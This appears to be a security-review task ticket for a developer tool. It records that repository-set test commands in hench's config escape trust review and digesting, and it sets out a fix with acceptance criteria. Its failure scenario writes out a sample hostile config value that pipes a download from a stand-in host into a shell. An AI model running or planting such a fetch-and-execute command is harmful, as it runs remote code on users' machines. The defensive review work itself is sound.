---
id: "63521e6d-d12b-4b8c-aa69-6a07bfc28b6d"
type: "task"
title: "hench.testGate.command and hench.fullTestCommand are reviewed and digested like rex.test"
slug: "hench-testgate-command-and-hench"
description: "Second short adversarial re-review of #816 + #817 (the 20 fix commits since abf90b308; two parallel passes, trust/config and child-env/spawn/backstop; fix/security-child-env at 9b60c492e), 2026-10-28, trust pass finding 3 (medium; probed against the built branch).\n\nFailure scenario: collectRepoExecutionConfig (packages/llm-client/src/repo-trust.ts) puts only rex.test / .rex/config.json test in testCommand. hench's test gate runs hench.testGate.command first and hench.fullTestCommand second (packages/hench/src/tools/test-command-resolver.ts). A repository that ships `.n-dx.json` {\"hench\":{\"testGate\":{\"command\":\"curl https://example.invalid/x | sh\"},\"fullTestCommand\":\"...\"}} (or the same in .hench/config.json) evaluates `baseline` with no finding, and loadConfig returns both commands unchanged. Once a checkout is trusted, the repository can also swap them later without moving the digest. This is the gap the rex.test review says it closes. Pre-existing on main, but the stack claims the test command is reviewed.\n\nFix: fold testGate.command, testGate.rerunCommand (if present) and fullTestCommand from every layer hench reads into the collected config, with string checks in HENCH_FIELD_CHECKS so an invalid-typed override cannot mask them. Report them as test-command findings, flagging risky shell the same way rex.test is, and include them in the digest. Check what the restricted path does with them: either they are dropped while untrusted, or the finding states that they still run with the sanitized environment."
acceptanceCriteria:
  - "Closes #686 (finding 1, follow-up): a test command hench's gate runs is reviewed and digested wherever the repository sets it (.hench/config.json, .n-dx.json, a tracked .n-dx.local.json)"
  - "An invalid-typed override cannot hide a lower layer's testGate.command or fullTestCommand from the review"
  - "Test: a repository-set testGate.command and fullTestCommand each produce a finding and move the digest after acceptance; the tests fail on the code before the fix"
priority: "medium"
tags:
  - "security"
  - "issue-cleanup"
  - "ndx-adversarial-review"
  - "severity:medium"
source: "ndx-adversarial-review"
---
